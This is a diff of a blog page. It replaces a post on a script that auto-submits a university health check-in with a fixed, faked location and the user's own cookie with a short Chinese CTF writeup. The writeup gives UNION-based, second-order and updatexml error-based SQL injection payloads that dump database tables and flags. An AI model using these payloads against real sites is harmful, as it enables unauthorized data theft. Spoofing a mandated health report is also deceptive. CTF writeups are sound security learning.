@@ -5,30 +5,30 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
         <meta name="robots" content="noodp" />
         <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
-        <title>企业微信自动健康上报脚本小记 - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="企业微信自动健康上报脚本小记" />
-<meta property="og:description" content="编写企业微信自动健康上报脚本小记" />
+        <title>中国计量大学大学生CTF竞赛 Writeup - Leon&#39;s Blog</title><meta name="Description" content="Leon&#39;s Blog-Keep learning web security"><meta property="og:title" content="中国计量大学大学生CTF竞赛 Writeup" />
+<meta property="og:description" content="中国计量大学现代科技学院举办的CTF比赛，写一下writeup" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://blog.h4ck.fun/qiye_weixin_health_check/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2021-12-02T23:19:52+08:00" />
-<meta property="article:modified_time" content="2021-12-02T23:19:52+08:00" />
+<meta property="og:url" content="https://blog.h4ck.fun/%E4%B8%AD%E5%9B%BD%E8%AE%A1%E9%87%8F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" /><meta property="og:image" content="https://blog.h4ck.fun/logo_.jpg"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-06-21T20:36:56+08:00" />
+<meta property="article:modified_time" content="2020-06-21T20:36:56+08:00" />
 
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://blog.h4ck.fun/logo_.jpg"/>
 
-<meta name="twitter:title" content="企业微信自动健康上报脚本小记"/>
-<meta name="twitter:description" content="编写企业微信自动健康上报脚本小记"/>
+<meta name="twitter:title" content="中国计量大学大学生CTF竞赛 Writeup"/>
+<meta name="twitter:description" content="中国计量大学现代科技学院举办的CTF比赛，写一下writeup"/>
 <meta name="application-name" content="Leon&#39;s Blog">
-<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/qiye_weixin_health_check/" /><link rel="prev" href="https://blog.h4ck.fun/shiro_721_analysis/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+<meta name="apple-mobile-web-app-title" content="Leon&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/logo.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://blog.h4ck.fun/%E4%B8%AD%E5%9B%BD%E8%AE%A1%E9%87%8F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" /><link rel="prev" href="https://blog.h4ck.fun/dozerctf2020-writeup/" /><link rel="next" href="https://blog.h4ck.fun/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
-        "headline": "企业微信自动健康上报脚本小记",
+        "headline": "中国计量大学大学生CTF竞赛 Writeup",
         "inLanguage": "zh-CN",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "https:\/\/blog.h4ck.fun\/qiye_weixin_health_check\/"
-        },"genre": "posts","keywords": "tool","wordcount":  2755 ,
-        "url": "https:\/\/blog.h4ck.fun\/qiye_weixin_health_check\/","datePublished": "2021-12-02T23:19:52+08:00","dateModified": "2021-12-02T23:19:52+08:00","publisher": {
+            "@id": "https:\/\/blog.h4ck.fun\/%E4%B8%AD%E5%9B%BD%E8%AE%A1%E9%87%8F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup\/"
+        },"genre": "posts","keywords": "条件竞争, SQL注入","wordcount":  262 ,
+        "url": "https:\/\/blog.h4ck.fun\/%E4%B8%AD%E5%9B%BD%E8%AE%A1%E9%87%8F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup\/","datePublished": "2020-06-21T20:36:56+08:00","dateModified": "2020-06-21T20:36:56+08:00","publisher": {
             "@type": "Organization",
             "name": "Leon","logo": "https:\/\/blog.h4ck.fun\/logo_.jpg"},"author": {
                 "@type": "Person",
@@ -102,10 +102,10 @@
                 <div class="container"><div class="toc" id="toc-auto">
             <h2 class="toc-title">Contents</h2>
             <div class="toc-content" id="toc-content-auto"></div>
-        </div><article class="page single"><h1 class="single-title animated flipInX">企业微信自动健康上报脚本小记</h1><div class="post-meta">
-            <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/tools/"><i class="far fa-folder fa-fw"></i>Tools</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-12-02">2021-12-02</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;2755 words&nbsp;
-                <i class="far fa-clock fa-fw"></i>&nbsp;6 minutes&nbsp;<span id="/qiye_weixin_health_check/" class="leancloud_visitors" data-flag-title="企业微信自动健康上报脚本小记">
+        </div><article class="page single"><h1 class="single-title animated flipInX">中国计量大学大学生CTF竞赛 Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="http://clq0.top" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw"></i>Leon</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw"></i>Writeup</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2020-06-21">2020-06-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;262 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;One minute&nbsp;<span id="/%E4%B8%AD%E5%9B%BD%E8%AE%A1%E9%87%8F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" class="leancloud_visitors" data-flag-title="中国计量大学大学生CTF竞赛 Writeup">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                     </span>&nbsp;</div>
         </div><div class="details toc" id="toc-static"  kept="">
@@ -115,39 +115,80 @@
                 </div>
                 <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
   <ul>
-    <li><a href="#关于">关于</a></li>
-    <li><a href="#环境">环境</a></li>
-    <li><a href="#使用">使用</a></li>
+    <li><a href="#easy-web">easy web</a></li>
+    <li><a href="#shop">shop</a></li>
+    <li><a href="#成绩单">成绩单</a></li>
+    <li><a href="#easy">easy</a></li>
   </ul>
 </nav></div>
-            </div><div class="content" id="content"><p>编写企业微信自动健康上报脚本小记</p>
-<h2 id="关于">关于</h2>
-<p>疫情期间学校要求每天都要健康打卡，之前是中午12点之前打卡，现在改成晚上21点到22点之间打卡，有时候事情多总是会忘，再加上周末可能会超过22点才回学校，上报定位也是个问题，因为这些原因，昨晚闲着没事给手机代理然后抓了个包，简单写了个脚本自动提交健康打卡。</p>
-<p>简单看了一下，表单页面是通过<code>form_id</code>来请求api获取需要填写的表单内容，我们提交的时候也是需要这个<code>form_id</code>，由于这个<code>form_id</code>每天可能都会变，需要先获取一下，也就是下图这个页面：</p>
-<p align="center">
-<img src="https://gitee.com/leonsec/images/raw/master/8CF7904CAC110B9C3F09D53417FDFCEF.jpg" alt="8CF7904CAC110B9C3F09D53417FDFCEF" style="zoom: 33%;" />
-</p>
-<p>API为：</p>
+            </div><div class="content" id="content"><p>中国计量大学现代科技学院举办的CTF比赛，写一下writeup</p>
+<h2 id="easy-web">easy web</h2>
+<p>原题</p>
+<p><code>?password[]</code>即可</p>
+<h2 id="shop">shop</h2>
+<p>条件竞争</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gitee.com/leonsec/images/raw/master/@SQQU9O80_3FLSDO1N2J.png"
+        data-srcset="https://gitee.com/leonsec/images/raw/master/@SQQU9O80_3FLSDO1N2J.png, https://gitee.com/leonsec/images/raw/master/@SQQU9O80_3FLSDO1N2J.png 1.5x, https://gitee.com/leonsec/images/raw/master/@SQQU9O80_3FLSDO1N2J.png 2x"
+        data-sizes="auto"
+        alt="https://gitee.com/leonsec/images/raw/master/@SQQU9O80_3FLSDO1N2J.png"
+        title="https://gitee.com/leonsec/images/raw/master/@SQQU9O80_3FLSDO1N2J.png" /></p>
+<h2 id="成绩单">成绩单</h2>
+<p>简单sql注入</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;union select 1,2,database(),group_concat(schema_name) from information_schema.schemata#
+</span><span class="s1">
+</span><span class="s1">web1
+</span><span class="s1">
+</span><span class="s1">-1&#39;</span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">),</span><span class="mi">3</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;web1&#39;</span><span class="o">#</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">fl4g</span><span class="p">,</span><span class="n">sc</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="o">-</span><span class="mi">1</span><span class="s1">&#39;union select 1,2,group_concat(column_name),3 from information_schema.columns where table_name=&#39;</span><span class="n">fl4g</span><span class="s1">&#39;#
+</span><span class="s1">
+</span><span class="s1">flag
+</span><span class="s1">
+</span><span class="s1">-1&#39;</span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">flag</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">web1</span><span class="p">.</span><span class="n">fl4g</span><span class="o">#</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">flag</span><span class="err">{</span><span class="n">Sql_INJECT0N_4813drd8hz4</span><span class="err">}</span><span class="w">
+</span></code></pre></td></tr></table>
+</div>
+</div><h2 id="easy">easy</h2>
+<p>尝试发现<code>admin</code>已经存在</p>
+<p>提示二次注入才想起来<code>upadte</code>也就是修改密码处可能存在过滤不严</p>
+<p>先注册为<code>admin&quot;#</code></p>
+<p>登陆后修改密码</p>
+<p>一般二次注入修改密码处语句为：</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">https://doc.weixin.qq.com/form/healthformlist
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">sql</span> <span class="o">=</span> <span class="s2">&#34;UPDATE users SET PASSWORD=&#39;</span><span class="si">$pass</span><span class="s2">&#39; where username=&#39;admin&#39;#&#39; and password=&#39;</span><span class="si">$curr_pass</span><span class="s2">&#39; &#34;</span><span class="p">;</span>
 </code></pre></td></tr></table>
 </div>
-</div><p>获取到其中的<code>form_id</code>就可以直接提交了，看了一下定位的流程，发现其实提交时提交的是写死的字符串</p>
-<p>在表单点击定位时，会调用手机gps获取当前坐标，然后调用腾讯地图api获取指定坐标的详细信息，如下图</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://gitee.com/leonsec/images/raw/master/image-20211202214529972-8452737.png"
-        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20211202214529972-8452737.png, https://gitee.com/leonsec/images/raw/master/image-20211202214529972-8452737.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20211202214529972-8452737.png 2x"
-        data-sizes="auto"
-        alt="https://gitee.com/leonsec/images/raw/master/image-20211202214529972-8452737.png"
-        title="image-20211202214529972" /></p>
-<p>所以其实最后提交的是获取的位置信息静态中文字符串，所以妈妈再也不用担心晚上十点后回学校的定位问题了</p>
-<p>提交的http报文如下：</p>
+</div><p>这样就修改了<code>admin</code>的密码</p>
+<p>登陆后发现啥也没有，想到可以结合<code>updatexml</code>报错注入</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -166,149 +207,51 @@
 </span><span class="lnt">14
 </span><span class="lnt">15
 </span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="nf">POST</span> <span class="nn">/form/share?f=json</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
-<span class="n">Host</span><span class="o">:</span> <span class="l">doc.weixin.qq.com</span>
-<span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=----WebKitFormBoundarynFnLeYS3a4cZQr7B</span>
-<span class="n">Origin</span><span class="o">:</span> <span class="l">https://doc.weixin.qq.com</span>
-<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
-<span class="n">Cookie</span><span class="o">:</span> <span class="l">**********************</span>
-<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
-<span class="n">Accept</span><span class="o">:</span> <span class="l">application/json, text/plain, */*</span>
-<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (iPhone; CPU iPhone OS 15_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)  Mobile/15E148 wxwork/3.1.18 MicroMessenger/7.0.1 Language/zh ColorScheme/Light</span>
-<span class="n">Referer</span><span class="o">:</span> <span class="l">https://doc.weixin.qq.com/</span>
-<span class="n">Content-Length</span><span class="o">:</span> <span class="l">1657</span>
-<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh-Hans;q=0.9</span>
-
-------WebKitFormBoundarynFnLeYS3a4cZQr7B
-Content-Disposition: form-data; name=&#34;type&#34;
-
-2
-------WebKitFormBoundarynFnLeYS3a4cZQr7B
-Content-Disposition: form-data; name=&#34;form_id&#34;
-
-AGkA4wfzAA0_AGkA4wfz-A0AH8AtgaFAFoxwj9N5t3Ql1638374400
-------WebKitFormBoundarynFnLeYS3a4cZQr7B
-Content-Disposition: form-data; name=&#34;form_reply&#34;
-
-{&#34;items&#34;:[{&#34;question_id&#34;:1,&#34;text_reply&#34;:&#34;{\&#34;type\&#34;:\&#34;\&#34;,\&#34;nation\&#34;:\&#34;中国\&#34;,\&#34;province\&#34;:\&#34;江苏省\&#34;,\&#34;city\&#34;:\&#34;南京市\&#34;,\&#34;district\&#34;:\&#34;栖霞区\&#34;,\&#34;addr\&#34;:\&#34;江苏省南京市南京邮电大学(仙林校区)\&#34;,\&#34;lat\&#34;:32.1126594543457,\&#34;lng\&#34;:118.93416595458984,\&#34;module\&#34;:\&#34;wework-native\&#34;,\&#34;exportText\&#34;:\&#34;江苏省南京市南京邮电大学(仙林校区)\&#34;}&#34;,&#34;option_reply&#34;:[]},{&#34;question_id&#34;:2,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[&#34;1&#34;]},{&#34;question_id&#34;:3,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[&#34;2&#34;]},{&#34;question_id&#34;:4,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[&#34;2&#34;]},{&#34;question_id&#34;:6,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[&#34;2&#34;]},{&#34;question_id&#34;:7,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[&#34;1&#34;]},{&#34;question_id&#34;:8,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[&#34;5&#34;]},{&#34;question_id&#34;:9,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[&#34;2&#34;]},{&#34;question_id&#34;:10,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[&#34;3&#34;]},{&#34;question_id&#34;:11,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[&#34;3&#34;]},{&#34;question_id&#34;:12,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[]},{&#34;question_id&#34;:13,&#34;text_reply&#34;:&#34;&#34;,&#34;option_reply&#34;:[]}]}
-------WebKitFormBoundarynFnLeYS3a4cZQr7B
-Content-Disposition: form-data; name=&#34;f&#34;
-
-json
-------WebKitFormBoundarynFnLeYS3a4cZQr7B
-Content-Disposition: form-data; name=&#34;source&#34;
-
-
-------WebKitFormBoundarynFnLeYS3a4cZQr7B
-Content-Disposition: form-data; name=&#34;vcode&#34;
-
-null
-------WebKitFormBoundarynFnLeYS3a4cZQr7B--
-
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="n">test</span><span class="s2">&#34;||updatexml(2,concat(0x7e,(database())),0)#
+</span><span class="s2">
+</span><span class="s2">easy
+</span><span class="s2">
+</span><span class="s2">空格可以用()绕过
+</span><span class="s2">test&#34;</span><span class="o">||</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="k">table_name</span><span class="p">))</span><span class="k">from</span><span class="p">(</span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="p">)</span><span class="k">where</span><span class="p">(</span><span class="n">table_schema</span><span class="p">)</span><span class="o">=</span><span class="s1">&#39;easy&#39;</span><span class="p">)),</span><span class="mi">0</span><span class="p">)</span><span class="o">#</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">article</span><span class="p">,</span><span class="n">flag</span><span class="p">,</span><span class="n">users</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">test</span><span class="s2">&#34;||updatexml(2,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;flag&#39;)),0)#
+</span><span class="s2">
+</span><span class="s2">flag
+</span><span class="s2">
+</span><span class="s2">test&#34;</span><span class="o">||</span><span class="n">updatexml</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="n">easy</span><span class="p">.</span><span class="n">flag</span><span class="p">))),</span><span class="mi">0</span><span class="p">)</span><span class="o">#</span><span class="w">
+</span><span class="w">
+</span><span class="w"></span><span class="n">flag</span><span class="err">{</span><span class="n">We11D0Ne_hOhO</span><span class="err">}</span><span class="w">
+</span></code></pre></td></tr></table>
 </div>
-</div><p>其中<code>form_reply</code>表单是提交的健康打卡表单内容，定位也为南京邮电大学，如果有其他要求可以自己修改</p>
-<p>基于此写了个自动化脚本，开源地址：</p>
-<p>Github: <a href="https://github.com/Le0nsec/qiye_weixin_health_check" target="_blank" rel="noopener noreffer">https://github.com/Le0nsec/qiye_weixin_health_check</a></p>
-<h2 id="环境">环境</h2>
-<p>Python2</p>
-<h2 id="使用">使用</h2>
-<ol>
-<li>
-<p>使用前请先安装<code>hackhttp</code>库</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">pip2 install hackhttp
-</code></pre></td></tr></table>
-</div>
-</div></li>
-<li>
-<p>添加你的企业微信cookie（因为考虑到多人使用，所以使用了dict，可以添加多个cookie，会遍历提交）
-先使用浏览器打开新的无痕窗口，访问：<a href="https://doc.weixin.qq.com/disklogin/login_page" target="_blank" rel="noopener noreffer">https://doc.weixin.qq.com/disklogin/login_page</a>，然后使用你登陆了南京邮电大学的<strong>企业微信</strong>（不是微信）扫码登陆</p>
-<p>登录后按F12打开开发者工具，或者在网页空白处右键点击“检查”，如下图：</p>
- <p align="center">
- <img src="https://gitee.com/leonsec/images/raw/master/144440784-d825f6ea-1657-470e-8fe5-ee94025789cd.png" alt="image" style="zoom:67%;" />
- </p>
-<p>然后在控制台(console)输入<code>document.cookie</code>查看当前cookie字符串：</p>
-<p><img
-        class="lazyload"
-        src="/svg/loading.min.svg"
-        data-src="https://gitee.com/leonsec/images/raw/master/144441988-90e30845-8a31-4c28-9751-1202047df99d.png"
-        data-srcset="https://gitee.com/leonsec/images/raw/master/144441988-90e30845-8a31-4c28-9751-1202047df99d.png, https://gitee.com/leonsec/images/raw/master/144441988-90e30845-8a31-4c28-9751-1202047df99d.png 1.5x, https://gitee.com/leonsec/images/raw/master/144441988-90e30845-8a31-4c28-9751-1202047df99d.png 2x"
-        data-sizes="auto"
-        alt="https://gitee.com/leonsec/images/raw/master/144441988-90e30845-8a31-4c28-9751-1202047df99d.png"
-        title="image" /></p>
-<p>复制后粘贴到脚本中即可</p>
-</li>
-<li>
-<p>运行</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">python2 auto_health_check.py
-</code></pre></td></tr></table>
-</div>
-</div><p>脚本中使用了server酱进行通知，打卡成功或者失败都将通知到手机，<SENDKEY>需要自行替换，具体用法参考<a href="https://sct.ftqq.com/" target="_blank" rel="noopener noreffer">https://sct.ftqq.com/</a>，如果不需要，可以自行删除这部分代码</p>
-<p><del>关于自动打卡，可以挂在服务器上设置定时任务运行，或者直接在代码中加sleep 24h。</del></p>
-<p>由于微文档的cookie只有一天有效期，无法持续自动打卡，因为客户端登录态是持久的，所以去看了一下企业微信的授权认证方式，发现是通过传wwapp_cst、wwapp_deviceid等参数给服务端，服务端确认后才set-cookie</p>
-<p>deviceid和vid是固定不变的，cst是客户端生成的，所以需要逆向企业微信看生成的算法，看能不能自己生成</p>
-<p><del>逆向ing&hellip;</del></p>
-<p>和逆向大手子一起逆了几天，frida hook来hook去，最后cst是与服务端通信获得的，过于麻烦所以没有继续跟下去了。</p>
-</li>
-</ol></div><div class="post-footer" id="post-footer">
+</div></div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>Updated on 2021-12-02</span>
+                <span>Updated on 2020-06-21</span>
             </div>
             <div class="post-info-license"></div>
         </div>
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/qiye_weixin_health_check/" data-title="企业微信自动健康上报脚本小记" data-via="Le0nsec" data-hashtags="tool"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/qiye_weixin_health_check/" data-hashtag="tool"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/qiye_weixin_health_check/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/qiye_weixin_health_check/" data-title="企业微信自动健康上报脚本小记"><i class="fab fa-weibo fa-fw"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://blog.h4ck.fun/%E4%B8%AD%E5%9B%BD%E8%AE%A1%E9%87%8F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" data-title="中国计量大学大学生CTF竞赛 Writeup" data-via="Le0nsec" data-hashtags="条件竞争,SQL注入"><i class="fab fa-twitter fa-fw"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://blog.h4ck.fun/%E4%B8%AD%E5%9B%BD%E8%AE%A1%E9%87%8F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" data-hashtag="条件竞争"><i class="fab fa-facebook-square fa-fw"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://blog.h4ck.fun/%E4%B8%AD%E5%9B%BD%E8%AE%A1%E9%87%8F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/"><i class="fab fa-reddit fa-fw"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://blog.h4ck.fun/%E4%B8%AD%E5%9B%BD%E8%AE%A1%E9%87%8F%E5%A4%A7%E5%AD%A6%E5%A4%A7%E5%AD%A6%E7%94%9Fctf%E7%AB%9E%E8%B5%9B-writeup/" data-title="中国计量大学大学生CTF竞赛 Writeup"><i class="fab fa-weibo fa-fw"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/tool/">tool</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89/">条件竞争</a>,&nbsp;<a href="/tags/sql%E6%B3%A8%E5%85%A5/">SQL注入</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/shiro_721_analysis/" class="prev" rel="prev" title="Shiro-721漏洞分析(CVE-2019-12422)"><i class="fas fa-angle-left fa-fw"></i>Shiro-721漏洞分析(CVE-2019-12422)</a></div>
+    <div class="post-nav"><a href="/dozerctf2020-writeup/" class="prev" rel="prev" title="DozerCTF2020 Writeup"><i class="fas fa-angle-left fa-fw"></i>DozerCTF2020 Writeup</a>
+            <a href="/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B2020-writeup/" class="next" rel="next" title="“第五空间”智能安全大赛2020 Writeup">“第五空间”智能安全大赛2020 Writeup<i class="fas fa-angle-right fa-fw"></i></a></div>
 </div>
 <div id="comments"><div id="valine" class="comment"></div><noscript>
                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
